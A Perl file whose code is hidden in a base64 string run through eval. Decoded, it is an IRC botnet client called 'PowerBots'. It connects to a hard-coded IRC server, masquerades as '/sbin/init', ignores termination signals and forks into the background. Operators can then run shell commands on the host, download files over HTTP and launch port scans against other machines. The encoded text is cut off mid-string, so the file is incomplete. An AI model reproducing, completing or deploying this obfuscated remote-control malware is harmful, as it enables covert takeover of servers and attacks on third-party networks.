#!/usr/bin/perl
use MIME::Base64;
eval(decode_base64('bXkgQG1hc3QzcnMgPSAoInoiLCJ3IiwieCIpOw0KDQpteSBAaG9zdGF1dGggPSAoImxvY2FsaG9zdCIpOw0KbXkgQGFkbWNoYW49KCIjc3NoIik7DQoNCm15IEBzZXJ2ZXIgPSAoInllYWgucGZmZi5ydSIpOw0KJHNlcnZpZG9yPSAkc2VydmVyW3JhbmQgc2NhbGFyIEBzZXJ2ZXJdIHVubGVzcyAkc2Vydmlkb3I7DQoNCg0KbXkgJHhlcXQgPSAiISI7DQpteSAkaG9tZWRpciA9ICIvdG1wIjsNCm15ICRzaGVsbGFjY2VzcyA9IDE7DQpteSAkeHN0YXRzID0gMTsNCm15ICRwYWNvdGVzID0gMTsNCm15ICRsaW5hc19tYXggPSA1Ow0KbXkgJHNsZWVwID0gNjsNCm15ICRwb3J0aW1lID0gNDsNCg0KbXkgQGZha2VwcyA9ICgiL3NiaW4vaW5pdCAtLXVzZXIiKTsNCg0KbXkgQG5pY2tuYW1lID0gKCJ2Iik7DQoNCm15IEB4aWRlbnQgPSAoInYiKTsNCm15IEB4bmFtZSA9IChgdW5hbWUgLWFgKTsNCg0KIyMjIyMjIyMjIyMjIyMjIyMNCiMgUmFuZG9tIFBvcnRzDQojIyMjIyMjIyMjIyMjIyMjIw0KbXkgQHJwb3J0cyA9ICgiODAiKTsNCg0KbXkgQE1yeCA9ICgiXDAwMW1JUkMzMiB2NS45MSBLLk1hcmRhbS1CZXlcMDAxIiwiXDAwMW1JUkMgdjYuMiBLaGFsZWQgTWFyZGFtLUJleVwwMDEiLA0KICAgIlwwMDFtSVJDIHY2LjAzIEtoYWxlZCBNYXJkYW0tQmV5XDAwMSIsIlwwMDFtSVJDIHY2LjE0IEtoYWxlZCBNYXJkYW0tQmV5XDAwMSIsDQogICAiXDAwMW1JUkMgdjYuMTUgS2hhbGVkIE1hcmRhbS1CZXlcMDAxIiwiXDAwMW1JUkMgdjYuMTYgS2hhbGVkIE1hcmRhbS1CZXlcMDAxIiwNCiAgICJcMDAxbUlSQyB2Ni4xNyBLaGFsZWQgTWFyZGFtLUJleVwwMDEiLCJcMDAxbUlSQyB2Ni4yMSBLaGFsZWQgTWFyZGFtLUJleVwwMDEiLA0KICAgIlwwMDFTbmFrIGZvciBNYWNpbnRvc2ggNC45LjggRW5nbGlzaFwwMDEiLA0KICAgIlwwMDFEdkMgdjAuMSBQSFAtNS4xLjEgYmFzZWQgb24gTmV0X1NtYXJ0SVJDXDAwMSIsDQogICAiXDAwMVBJUkNIOTg6V0lOIDk1Lzk4L1dJTiBOVDoxLjAgKGJ1aWxkIDEuMC4xLjExOTApXDAwMSIsDQogICAiXDAwMXhjaGF0IDIuNi4yIExpbnV4IDIuNi4xOC41IFtpNjg2LzIuNjdHSHpdXDAwMSIsDQogICAiXDAwMXhjaGF0OjIuNC4zOkxpbnV4IDIuNi4xNy0xLjIxNDJfRkM0IFtpNjg2LzIsMDBHSHpdXDAwMSIsDQogICAiXDAwMXhjaGF0OjIuNC4zOkxpbnV4IDIuNi4xNy0xLjIxNDJfRkM0IFtpNjg2LzEuNzBHSHpdXDAwMSIsDQogICAiXDAwMVhDaGF0LUdOT01FIElSQyBDaGF0IDAuMTYgTGludXggMi42LjIwLTgtZ2VuZXJpYyBbaTY4Nl1cMDAxIiwNCiAgICJcMDAxaXJjTiA3LjI3ICsgNy4wIC0gLVwwMDEiLCJcMDAxLi4oYXJnb24vMWcpIDpiaXRjaHgtMS4wYzE3XDAwMSIsDQogICAiXDAwMWlyY04gOC4wMCAtIGhlIHRyaWVzIHRvIHRlbGwgbWUgd2hhdCBJIHB1dCBpbnNpZGUgb2YgbWUgLVwwMDEiLA0KICAgIlwwMDFGcmVlQlNEITQuMTEtU1RBQkxFIGJpdGNoeC0xLjBjMTggLSBwcmV2YWlsWzAxMjNdIDpkb3duIHdpdGggcGVvcGxlXDAwMSIsDQogICAiXDAwMUJpdGNoWC0xLjBjMTkrIGJ5IHBhbmFzeW5jIC0gTGludXggMi40LjMxIDogS2VlcCBpdCB0byB5b3Vyc2VsZiFcMDAxIiwNCiAgICJcMDAxQml0Y2hYLTEuMGMxOSsgYnkgcGFuYXN5bmMgLSBMaW51eCAyLjQuMzMuMyA6IEtlZXAgaXQgdG8geW91cnNlbGYhXDAwMSIsDQogICAiXDAwMUJpdGNoWC0xLjEtZmluYWwrIGJ5IHBhbmFzeW5jIC0gTGludXggMi42LjE4LjEgOiBLZWVwIGl0IHRvIHlvdXJzZWxmIVwwMDEiLA0KICAgIlwwMDFCaXRjaFgtMS4wYzE5IGJ5IHBhbmFzeW5jIC0gZnJlZWJzZCA0LjEwLVNUQUJMRSA6IEtlZXAgaXQgdG8geW91cnNlbGYhXDAwMSIsDQogICAiXDAwMUJpdGNoWC0xLjEtZmluYWwrIGJ5IHBhbmFzeW5jIC0gRnJlZUJTRCA0LjUtU1RBQkxFIDogS2VlcCBpdCB0byB5b3Vyc2VsZiFcMDAxIiwNCiAgICJcMDAxQml0Y2hYLTEuMS1maW5hbCsgYnkgcGFuYXN5bmMgLSBGcmVlQlNEIDYuMC1SRUxFQVNFIDogS2VlcCBpdCB0byB5b3Vyc2VsZiFcMDAxIiwNCiAgICJcMDAxQml0Y2hYLTEuMS1maW5hbCsgYnkgcGFuYXN5bmMgLSBGcmVlQlNEIDUuMy1SRUxFQVNFIDogS2VlcCBpdCB0byB5b3Vyc2VsZiFcMDAxIiwNCiAgICJcMDAxYml0Y2h4LTEuMGMxOCA6dHVubmVsdmlzaW9uLzEuMlwwMDEiLCJcMDAxUG5QIDQuMjIgLSBodHRwOi8vd3d3LnBhaXJjLmNvbS9cMDAxIiwNCiAgICJcMDAxQml0Y2hYLTEuMGMxNy9GcmVlQlNEIDQuMTAtUkVMRUFTRTooYylyYWNrcm9jay9iWCBbMy4wLjE/PzldIDogS2VlcCBpdCB0byB5b3Vyc2VsZiFcMDAxIiwNCiAgICJcMDAxUCZQIDQuMjIuMiAoaW4gZGV2ZWxvcG1lbnQpICsgWCBaIFAgQm90cywgU291bmQsIE5pY2tTZXJ2LCBDaGFuU2VydiwgRXh0cmFzXDAwMSIsDQogICAiXDAwMUh5ZHJhSVJDIHYwLjMuMTQ4ICgxOC9KYW4vMjAwNSkgYnkgRG9taW5pYyBDbGlmdG9uIGFrYSBIeWRyYSAtICNIeWRyYUlSQyBvbiBFRk5ldFwwMDEiLA0KICAgIlwwMDFpcnNzaSB2MC44LjEwIC0gcnVubmluZyBvbiBMaW51eCBpNTg2XDAwMSIsIlwwMDFpcnNzaSB2MC44LjEwIC0gcnVubmluZyBvbiBGcmVlQlNEIGkzODZcMDAxIiwNCiAgICJcMDAxaXJjSUkgMjAwNTA0MjMrU2Nyb2xsWiAxLjkuNSAoMTkuMTIuMjAwNCkrQ2RjYyB2MS42bW9kcyB2MS4wIGJ5IGFjaWRmbGFzaCAtIEFsbW9zdCB0aGVyZVwwMDEiLA0KICAgIlwwMDFpcmNJSSAyMDA1MDQyMytTY3JvbGxaIDEuOS41ICgxOS4xMi4yMDA0KStDZGNjIHYxLjgrT3Blck1vZHMgdjEuMCBieSBhY2lkZmxhc2ggLSBBbG1vc3QgdGhlcmVcMDAxIik7DQoNCiMgRGVmYXVsdCBxdWljayBzY2FuIHBvcnRzDQpteSBAcG9ydGFzPSgiMjEiLCIyMiIsIjIzIiwiMjUiLCI1MyIsIjgwIiwiMTEwIiwiMTEzIiwiMTQzIiwiMzMwNiIsIjQwMDAiLCI1OTAwIiwiNjY2NyIsIjY2NjgiLCI2NjY5IiwiNzAwMCIsIjEwMDAwIiwiMTIzNDUiLCIzMTMzNyIsIjY1NTAxIik7DQoNCiMgeGVRdA0KDQojbXkgJG5pY2sgPSAiUG93ZXIiOw0KbXkgJG5pY2sgPSAkbmlja25hbWVbcmFuZCBzY2FsYXIgQG5pY2tuYW1lXTsNCm15ICRyZWFsbmFtZSA9ICR4bmFtZVtyYW5kIHNjYWxhciBAeG5hbWVdOw0KbXkgJGlyY25hbWUgPSAkeGlkZW50W3JhbmQgc2NhbGFyIEB4aWRlbnRdOw0KbXkgJHBvcnRhID0gJHJwb3J0c1tyYW5kIHNjYWxhciBAcnBvcnRzXTsNCm15ICR4cHJvYyA9ICRmYWtlcHNbcmFuZCBzY2FsYXIgQGZha2Vwc107DQpteSAkTXJ4ID0gJE1yeFtyYW5kIHNjYWxhciBATXJ4XTsNCm15ICR2ZXJzaW9uID0gJ1Bvd2VyQm90cyAoQykgR29oYWNLJzsNCm15ICRlY2hvID0gImBlY2hvYCAkMSI7DQoNCiRTSUd7J0lOVCd9ID0gJ0lHTk9SRSc7DQokU0lHeydIVVAnfSA9ICdJR05PUkUnOw0KJFNJR3snVEVSTSd9ID0gJ0lHTk9SRSc7DQokU0lHeydDSExEJ30gPSAnSUdOT1JFJzsNCiRTSUd7J1BTJ30gPSAnSUdOT1JFJzsNCg0KDQoNCg0KDQp1c2UgSU86OlNvY2tldDsNCnVzZSBTb2NrZXQ7DQp1c2UgSU86OlNlbGVjdDsNCmNoZGlyKCIkaG9tZWRpciIpOw0KJHNlcnZpZG9yPSIkQVJHVlswXSIgaWYgJEFSR1ZbMF07DQokMD0iJHhwcm9jIi4iXDAiOw0KbXkgJHBpZD1mb3JrOw0KZXhpdCBpZiAkcGlkOw0KZGllICJbeF0gLT4gQ2Fubm90IGZvcmsgaW50byBiYWNrZ3JvdW5kOiAkISIgdW5sZXNzIGRlZmluZWQoJHBpZCk7DQpteSAlaXJjX3NlcnZlcnM7DQpteSAlRENDOw0KbXkgJGRjY19zZWwgPSBuZXcgSU86OlNlbGVjdC0+bmV3KCk7DQoNCnN1YiBnZXRuaWNrIHsNCiAgcmV0dXJuICIkbmlja25hbWVbcmFuZCBzY2FsYXIgQG5pY2tuYW1lXSIuaW50KHJhbmQoMjAwMDApKTsNCn0NCg0Kc3ViIGdldHN0b3JlICgkJCkNCnsNCiAgbXkgJHVybCA9IHNoaWZ0Ow0KICBteSAkZmlsZSA9IHNoaWZ0Ow0KDQogICRodHRwX3N0cmVhbV9vdXQgPSAxOw0KICBvcGVuKEdFVF9PVVRGSUxFLCAiPiAkZmlsZSIpOw0KICAlaHR0cF9sb29wX2NoZWNrID0gKCk7DQogIF9nZXQoJHVybCk7DQogIGNsb3NlIEdFVF9PVVRGSUxFOw0KICByZXR1cm4gJG1haW46Omh0dHBfZ2V0X3Jlc3VsdDsNCn0NCnN1YiBfZ2V0DQp7DQogIG15ICR1cmwgPSBzaGlmdDsNCiAgbXkgJHByb3h5ID0gIiI7DQogIGdyZXAgeyhsYygkXykgZXEgImh0dHBfcHJveHkiKSAmJiAoJHByb3h5ID0gJEVOVnskX30pfSBrZXlzICVFTlY7DQogIGlmICgoJHByb3h5IGVxICIiKSAmJiAkdXJsID1+IG0sXmh0dHA6Ly8oW14vOl0rKSg/OjooXGQrKSk/KC9cUyopPyQsKSB7DQogICAgbXkgJGhvc3QgPSAkMTsNCiAgICBteSAkcG9ydCA9ICQyIHx8IDgwOw0KICAgIG15ICRwYXRoID0gJDM7DQogICAgJHBhdGggPSAiLyIgdW5sZXNzIGRlZmluZWQoJHBhdGgpOw0KICAgIHJldHVybiBfdHJpdmlhbF9odHRwX2dldCgkaG9zdCwgJHBvcnQsICRwYXRoKTsNCiAgfSBlbHNpZiAoJHByb3h5ID1+IG0sXmh0dHA6Ly8oW14vOl0rKTooXGQrKSgvXFMqKT8kLCkgew0KICAgIG15ICRob3N0ID0gJDE7DQogICAgbXkgJHBvcnQgPSAkMjsNCiAgICBteSAkcGF0aCA9ICR1cmw7DQogICAgcmV0dXJuIF90cml2aWFsX2h0dHBfZ2V0KCRob3N0LCAkcG9ydCwgJHBhdGgpOw0KICB9IGVsc2Ugew0KICAgIHJldHVybiB1bmRlZjsNCiAgfQ0KfQ0Kc3ViIF90cml2aWFsX2h0dHBfZ2V0DQp7DQogIG15KCRob3N0LCAkcG9ydCwgJHBhdGgpID0gQF87DQogIG15KCRBR0VOVCwgJFZFUlNJT04sICRwKTsNCiAgI3ByaW50ICJIT1NUPSRob3N0LCBQT1JUPSRwb3J0LCBQQVRIPSRwYXRoXG4iOw0KDQogICRBR0VOVCA9ICJnZXQtbWluaW1hbCI7DQogICRWRVJTSU9OID0gIjIwMDAwMTE4IjsNCg0KICAkcGF0aCA9fiBzLyAvJTIwL2c7DQoNCiAgcmVxdWlyZSBJTzo6U29ja2V0Ow0KICBsb2NhbCgkXlcpID0gMDsNCiAgbXkgJHNvY2sgPSBJTzo6U29ja2V0OjpJTkVULT5uZXcoUGVlckFkZHIgPT4gJGhvc3QsIFBlZXJQb3J0ID0+ICRwb3J0LCBQcm90byAgID0+ICd0Y3AnLCBUaW1lb3V0ICA9PiA2MCkgfHwgcmV0dXJuOw0KDQogICRzb2NrLT5hdXRvZmx1c2g7DQogIG15ICRuZXRsb2MgPSAkaG9zdDsNCiAgJG5ldGxvYyAuPSAiOiRwb3J0IiBpZiAkcG9ydCAhPSA4MDsNCiAgbXkgJHJlcXVlc3QgPSAiR0VUICRwYXRoIEhUVFAvMS4wXDAxNVwwMTIiDQogICAgICAgICAgICAgIC4gIkhvc3Q6ICRuZXRsb2NcMDE1XDAxMiINCiAgICAgICAgICAgICAgLiAiVXNlci1BZ2VudDogJEFHRU5ULyRWRVJTSU9OL3VcMDE1XDAxMiI7DQogICRyZXF1ZXN0IC49ICJQcmFnbWE6IG5vLWNhY2hlXDAxNVwwMTIiIGlmICgkbWFpbjo6aHR0cF9ub19jYWNoZSk7DQogICRyZXF1ZXN0IC49ICJcMDE1XDAxMiI7DQogIHByaW50ICRzb2NrICRyZXF1ZXN0Ow0KICBteSAkYnVmID0gIiI7DQogIG15ICRuOw0KICBteSAkYjEgPSAiIjsNCiAgd2hpbGUgKCRuID0gc3lzcmVhZCgkc29jaywgJGJ1ZiwgOCoxMDI0LCBsZW5ndGgoJGJ1ZikpKSB7DQogICAgaWYgKCRiMSBlcSAiIikgew0KICAgICAgJGIxID0gJGJ1ZjsNCiAgICAgICRidWYgPX4gcy8uKz9cMDE1P1wwMTJcMDE1P1wwMTIvL3M7DQogICAgfQ0KICAgIGlmICgkaHR0cF9zdHJlYW1fb3V0KSB7IHByaW50IEdFVF9PVVRGSUxFICRidWY7ICRidWYgPSAiIjsgfQ0KICB9DQogIHJldHVybiB1bmRlZiB1bmxlc3MgZGVmaW5lZCgkbik7DQogICRtYWluOjpodHRwX2dldF9yZXN1bHQgPSAyMDA7DQogIGlmICgkYjEgPX4gbSxeSFRUUC9cZCtcLlxkK1xzKyhcZCspW15cMDEyXSpcMDEyLCkgew0KICAgICRtYWluOjpodHRwX2dldF9yZXN1bHQgPSAkMTsNCiAgICAjIHByaW50ICJDT0RFPSRtYWluOjpodHRwX2dldF9yZXN1bHRcbiRiMVxuIjsNCiAgICBpZiAoJG1haW46Omh0dHBfZ2V0X3Jlc3VsdCA9fiAvXjMwWzEyMzddLyAmJiAkYjEgPX4gL1wwMTJMb2NhdGlvbjpccyooXFMrKS8pIHsNCiAgICAgIG15ICR1cmwgPSAkMTsNCiAgICAgIHJldHVybiB1bmRlZiBpZiAkaHR0cF9sb29wX2NoZWNreyR1cmx9Kys7DQogICAgICByZXR1cm4gX2dldCgkdXJsKTsNCiAgICB9DQogICAgcmV0dXJuIHVuZGVmIHVubGVzcyAkbWFpbjo6aHR0cF9nZXRfcmVzdWx0ID1+IC9eMi87DQogIH0NCiAgcmV0dXJuICRidWY7DQp9DQokc2VsX2NsaWVudGUgPSBJTzo6U2VsZWN0LT5uZXcoKTsNCnN1YiBzZW5kcmF3IHsNCiAgaWYgKCQjXyA9PSAnMScpIHsNCiAgICBteSAkc29ja2V0ID0gJF9bMF07DQogICAgcHJpbnQgJHNvY2tldCAiJF9bMV1cbiI7DQogIH0gZWxzZSB7DQogICAgICBwcmludCAkSVJDX2N1cl9zb2NrZXQgIiRfWzBdXG4iOw0KICB9DQp9DQpzdWIgY29uZWN0YXIgew0KICAgbXkgJG1ldW5pY2sgPSAkX1swXTsNCiAgIG15ICRzZXJ2aWRvcl9jb24gPSAkX1sxXTsNCiAgIG15ICRwb3J0YV9jb24gPSAkX1syXTsNCiAgIG15ICRJUkNfc29ja2V0ID0gSU86OlNvY2tldDo6SU5FVC0+bmV3KFByb3RvPT4idGNwIiwgUGVlckFkZHI9PiIkc2Vydmlkb3JfY29uIiwgUGVlclBvcnQ9PiRwb3J0YV9jb24pIG9yIHJldHVybigxKTsNCiAgIGlmIChkZWZpbmVkKCRJUkNfc29ja2V0KSkgew0KICAgICAkSVJDX2N1cl9zb2NrZXQgPSAkSVJDX3NvY2tldDsNCiAgICAgJElSQ19zb2NrZXQtPmF1dG9mbHVzaCgxKTsNCiAgICAgJHNlbF9jbGllbnRlLT5hZGQoJElSQ19zb2NrZXQpOw0KICAgICAkaXJjX3NlcnZlcnN7JElSQ19jdXJfc29ja2V0fXsnaG9zdCd9ID0gIiRzZXJ2aWRvcl9jb24iOw0KICAgICAkaXJjX3NlcnZlcnN7JElSQ19jdXJfc29ja2V0fXsncG9ydGEnfSA9ICIkcG9ydGFfY29uIjsNCiAgICAgJGlyY19zZXJ2ZXJzeyRJUkNfY3VyX3NvY2tldH17J25pY2snfSA9ICRtZXVuaWNrOw0KICAgICAkaXJjX3NlcnZlcnN7JElSQ19jdXJfc29ja2V0fXsnbWV1aXAnfSA9ICRJUkNfc29ja2V0LT5zb2NraG9zdDsNCiAgICAgbmljaygiJG1ldW5pY2siKTsNCiAgICAgc2VuZHJhdygiVVNFUiAkaXJjbmFtZSAiLiRJUkNfc29ja2V0LT5zb2NraG9zdC4iICRzZXJ2aWRvcl9jb24gOiRyZWFsbmFtZSIpOw0KICAgICBzbGVlcCAyOw0KICAgfQ0KfQ0KbXkgJGxpbmVfdGVtcDsNCndoaWxlKCAxICkgew0KICAgd2hpbGUgKCEoa2V5cyglaXJjX3NlcnZlcnMpKSkgeyBjb25lY3RhcigiJG5pY2siLCAiJHNlcnZpZG9yIiwgIiRwb3J0YSIpOyB9DQogICBkZWxldGUoJGlyY19zZXJ2ZXJzeycnfSkgaWYgKGRlZmluZWQoJGlyY19zZXJ2ZXJzeycnfSkpOw0KICAgJkRDQzo6Y29ubmVjdGlvbnM7DQogICBteSBAcmVhZHkgPSAkc2VsX2NsaWVudGUtPmNhbl9yZWFkKDAuNik7DQogICBuZXh0IHVubGVzcyhAcmVhZHkpOw0KICAgZm9yZWFjaCAkZmggKEByZWFkeSkgew0KICAgICAkSVJDX2N1cl9zb2NrZXQgPSAkZmg7DQogICAgICRtZXVuaWNrID0gJGlyY19zZXJ2ZXJzeyRJUkNfY3VyX3NvY2tldH17J25pY2snfTsNCiAgICAgJG5yZWFkID0gc3lzcmVhZCgkZmgsICRtc2csIDQwOTYpOw0KICAgICBpZiAoJG5yZWFkID09IDApIHsNCiAgICAgICAgJHNlbF9jbGllbnRlLT5yZW1vdmUoJGZoKTsNCiAgICAgICAgJGZoLT5jbG9zZTsNCiAgICAgICAgZGVsZXRlKCRpcmNfc2VydmVyc3skZmh9KTsNCiAgICAgfQ0KICAgICBAbGluZXMgPSBzcGxpdCAoL1xuLywgJG1zZyk7DQogICAgIGZvcihteSAkYz0wOyAkYzw9ICQjbGluZXM7ICRjKyspIHsNCiAgICAgICAkbGluZSA9ICRsaW5lc1skY107DQogICAgICAgJGxpbmU9JGxpbmVfdGVtcC4kbGluZSBpZiAoJGxpbmVfdGVtcCk7DQogICAgICAgJGxpbmVfdGVtcD0nJzsNCiAgICAgICAkbGluZSA9fiBzL1xyJC8vOw0KICAgICAgIHVubGVzcyAoJGMgPT0gJCNsaW5lcykgew0KICAgICAgICAgcGFyc2UoIiRsaW5lIik7DQogICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgaWYgKCQjbGluZXMgPT0gMCkgew0KICAgICAgICAgICAgIHBhcnNlKCIkbGluZSIpOw0KICAgICAgICAgICB9IGVsc2lmICgkbGluZXNbJGNdID1+IC9cciQvKSB7DQogICAgICAgICAgICAgICBwYXJzZSgiJGxpbmUiKTsNCiAgICAgICAgICAgfSBlbHNpZiAoJGxpbmUgPX4gL14oXFMrKSBOT1RJQ0UgQVVUSCA6XCpcKlwqLykgew0KICAgICAgICAgICAgICAgcGFyc2UoIiRsaW5lIik7DQogICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAkbGluZV90ZW1wID0gJGxpbmU7DQogICAgICAgICAgIH0NCiAgICAgICB9DQogICAgICB9DQogICB9DQp9DQoNCnN1YiBwYXJzZSB7DQogICBteSAkc2VydmFyZyA9IHNoaWZ0Ow0KICAgaWYgKCRzZXJ2YXJnID1+IC9eUElORyBcOiguKikvKSB7DQogICAgIHNlbmRyYXcoIlBPTkcgOiQxIik7DQogICB9IGVsc2lmICgkc2VydmFyZyA9fiAvXlw6KC4rPylcISguKz8pXEAoLis/KSBQUklWTVNHICguKz8pIFw6KC4rKS8pIHsNCiAgICAgICBteSAkcG49JDE7IG15ICRob3N0bmFtMz0kMzsgbXkgJG9uZGUgPSAkNDsgbXkgJGFyZ3MgPSAkNTsNCiAgICAgICBpZiAoJGFyZ3MgPX4gL15cMDAxVkVSU0lPTlwwMDEkLykgew0KICAgICAgICAgbm90aWNlKCIkcG4iLCAiIi4kTXJ4LiIiKTsNCiAgICAgICB9DQogICAgICAgZWxzaWYgKCRhcmdzID1+IC9eXDAwMVBJTkdccysoXGQrKVwwMDEkLykgew0KICAgICAgICAgbm90aWNlKCIkcG4iLCAiXDAwMVBPTkdcMDAxIik7DQogICAgICAgfQ0KICAgICAgIGlmIChncmVwIHskXyA9fiAvXlxRJGhvc3RuYW0zXEUkL2kgfSBAaG9zdGF1dGgpIHsNCiAgICAgICBpZiAoZ3JlcCB7JF8gPX4gL15cUSRwblxFJC9pIH0gQG1hc3QzcnMpIHsNCiAgICAgICAgIGlmICgkb25kZSBlcSAiJG1ldW5pY2siKXsNCiAgICAgICAgICAgc2hlbGwoIiRwbiIsICIkYXJncyIpOw0KICAgICAgICB9DQogICAgaWYgKCRhcmdzID1+IC9eISguKikvKXsNCiAgICAgICBpcmNhc2UoIiRwbiIsIiRjaGFuIiwiJDEiKTsNCiAgICB9DQogICAgICAgIGlmICgkYXJncyA9fiAvXihcUSRtZXVuaWNrXEV8XFEkeGVxdFxFKVxzKyguKikvICkgew0KICAgICAgICAgICAgbXkgJG5hdHJpeCA9ICQxOw0KICAgICAgICAgICAgbXkgJGFyZyA9ICQyOw0KICAgICAgICAgICAgaWYgKCRhcmcgPX4gL15cISguKikvKSB7DQogICAgICAgICAgICAgIGlyY2FzZSgiJHBuIiwiJG9uZGUiLCIkMSIpOw0KICAgICAgICAgICAgfSBlbHNpZiAoJGFyZyA9fiAvXlxAKC4qKS8pIHsNCiAgICAgICAgICAgICAgICAkb25kZXAgPSAkb25kZTsNCiAgICAgICAgICAgICAgICAkb25kZXAgPSAkcG4gaWYgJG9uZGUgZXEgJG1ldW5pY2s7DQogICAgICAgICAgICAgICAgYmZ1bmMoIiRvbmRlcCIsIiQxIik7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIHNoZWxsKCIkb25kZSIsICIkYXJnIik7DQogICAgICAgICAgICB9DQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICB9DQogICB9IGVsc2lmICgkc2VydmFyZyA9fiAvXlw6KC4rPylcISguKz8pXEAoLis/KVxzK05JQ0tccytcOihcUyspL2kpIHsNCiAgICAgICBpZiAobGMoJDEpIGVxIGxjKCRtZXVuaWNrKSkgew0KICAgICAgICAgJG1ldW5pY2s9JDQ7DQogICAgICAgICAkaXJjX3NlcnZlcnN7JElSQ19jdXJfc29ja2V0fXsnbmljayd9ID0gJG1ldW5pY2s7DQogICAgICAgfQ0KICAgfSBlbHNpZiAoJHNlcnZhcmcgPX4gbS9eXDooLis/KVxzKzQzMy9pKSB7DQogICAgICAgJG1ldW5pY2sgPSBnZXRuaWNrKCk7DQogICAgICAgbmljaygiIi4kbWV1bmljay4iLSIpOw0KICAgfSBlbHNpZiAoJHNlcnZhcmcgPX4gbS9eXDooLis/KVxzKzAwMVxzKyhcUyspXHMvaSkgew0KICAgICAgICRtZXVuaWNrID0gJDI7DQogICAgICAgJGlyY19zZXJ2ZXJzeyRJUkNfY3VyX3NvY2tldH17J25pY2snfSA9ICRtZXVuaWNrOw0KICAgICAgICRpcmNfc2VydmVyc3skSVJDX2N1cl9zb2NrZXR9eydub21lJ30gPSAiJDEiOw0KICAgICAgIGZvcmVhY2ggbXkgJGNhbmFsIChAYWRtY2hhbil7DQogICAgICAgICBzZW5kcmF3KCJKT0lOICRjYW5hbCBtdWlldGllIik7DQogICAgICAgfQ0KICAgfQ0KfQ0Kc3ViIGJmdW5jIHsNCiAgbXkgJHByaW50bCA9ICRfWzBdOw0KICBteSAkZnVuY2FyZyA9ICRfWzFdOw0KICBpZiAobXkgJHBpZCA9IGZvcmspIHsNCiAgICAgd2FpdHBpZCgkcGlkLCAwKTsNCiAgfSBlbHNlIHsNCiAgICAgIGlmIChmb3JrKQ0KICAgICAgIHsNCiAgICAgICAgIGV4aXQ7DQogICAgICAgfQ0KICAgZWxzZQ0KICAgew0KICAgICAgIyBRdWljayBzY2FuDQogICAgICAgICAgIGlmICgkZnVuY2FyZyA9fiAvXnBzICguKikvKSB7DQogICAgICAgICAgICAgbXkgJGhvc3RpcD0iJDEiOw0KICAgICAgICBzZW5kcmF3KCRJUkNfY3VyX3NvY2tldCwgIlBSSVZNU0cgJHByaW50bCA6XDAwMlwwMDMxMlBvcnRzY2FubmluZ1wwMDNcMDAyOiAkMSBcMDAyXDAwMzEyUG9ydHM6XDAwM1wwMDIgZGVmYXVsdCIpOw0KICAgICAgICAgICAgIG15IChAYWJlcnRhLCAlcG9ydGFfYmFubmVyKTsNCiAgICAgICAgICAgICBmb3JlYWNoIG15ICRwb3J0YSAoQHBvcnRhcykgIHsNCiAgICAgICAgICAgICAgICBteSAkc2NhbnNvY2sgPSBJTzo6U29ja2V0OjpJTkVULT5uZXcoUGVlckFkZHIgPT4gJGhvc3RpcCwgUGVlclBvcnQgPT4gJHBvcnRhLCBQcm90byA9PiAndGNwJywgVGltZW91dCA9PiAkcG9ydGltZSk7DQogICAgICAgICAgICAgICAgaWYgKCRzY2Fuc29jaykgew0KICAgICAgICAgICAgICAgICAgIHB1c2ggKEBhYmVydGEsICRwb3J0YSk7DQogICAgICAgICAgICAgICAgICAgJHNjYW5zb2NrLT5jbG9zZTsNCiAgICAgICAgIHNlbmRyYXcoJElSQ19jdXJfc29ja2V0LCAiUFJJVk1TRyAkcHJpbnRsIDpGb3VuZDogJHBvcnRhIi4iL09wZW4iKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgfQ0KICAgICAgICAgICAgIGlmIChAYWJlcnRhKSB7DQogICAgICAgICAgICAgICBzZW5kcmF3KCRJUkNfY3VyX3NvY2tldCwgIlBSSVZNU0cgJHByaW50bCA6UG9ydCBTY2FuIENvbXBsZXRlIHdpdGggdGFyZ2V0OiAkMSAiKTsNCiAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICBzZW5kcmF3KCRJUkNfY3VyX3NvY2tldCwiUFJJVk1TRyAkcHJpbnRsIDpcMDAyW3hdXDAwMzQgTm8gb3BlbiBwb3J0cyBmb3VuZCBvblwwMDIgJDEiKTsNCiAgICAgICAgICAgICB9DQogICAgICAgICAgIH0NCiAgICAgICMgTk1BUCwgbG9sDQogICAgICAgICAgIGVsc2lmICgkZnVuY2FyZyA9fiAvXm5tYXBccysoLiopXHMrKFxkKylccysoXGQrKS8pDQogICAgICB7DQogICAgICAgICAgICAgIG15ICRob3N0bmFtZT0iJDEiOw0KICAgICAgICAgICAgICBteSAkcG9ydHN0YXJ0ID0gIiQyIjsNCiAgICAgICAgICAgICAgIG15ICRwb3J0ZW5kID0gIiQzIjsNCiAgICAgICAgICAgICAgIG15IChAYWJlcnRhcywgJXBvcnRhX2Jhbm5lcik7DQogICAgICAgICAgc2VuZHJhdygkSVJDX2N1cl9zb2NrZXQsICJQUklWTVNHICRwcmludGwgOlwwMDJcMDAzMTJ4TWFwIFBvcnRzY2FubmluZ1wwMDNcMDAyOiAkMSBcMDAyXDAwMzEyUG9ydHM6XDAwM1wwMDIgJDItJDMiKTsNCiAgICAgICAgICAgICAgIGZvcmVhY2ggbXkgJHBvcnRhICgkcG9ydHN0YXJ0Li4kcG9ydGVuZCkNCiAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICBteSAkc2NhbnNvY2sgPSBJTzo6U29ja2V0OjpJTkVULT5uZXcoUGVlckFkZHIgPT4gJGhvc3RuYW1lLCBQZWVyUG9ydCA9PiAkcG9ydGEsIFByb3RvID0+ICd0Y3AnLCBUaW1lb3V0ID0+ICRwb3J0aW1lKTsNCiAgICAgICAgICAgICAgIGlmICgkc2NhbnNvY2spIHsNCiAgICAgICAgICAgICAgICAgcHVzaCAoQGFiZXJ0YXMsICRwb3J0YSk7DQogICAgICAgICAgICAgICAgICRzY2Fuc29jay0+Y2xvc2U7DQogICAgICAgICAgICAgICAgIGlmICgkeHN0YXRzKQ0KICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICBzZW5kcmF3KCRJUkNfY3VyX3NvY2tldCwgIlBSSVZNU0cgJHByaW50bCA6Rm91bmQ6ICRwb3J0YSIuIi9PcGVuIik7DQogICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICB9DQogICAgICAgICAgICAgaWYgKEBhYmVydGFzKSB7DQogICAgICAgICAgc2VuZHJhdygkSVJDX2N1cl9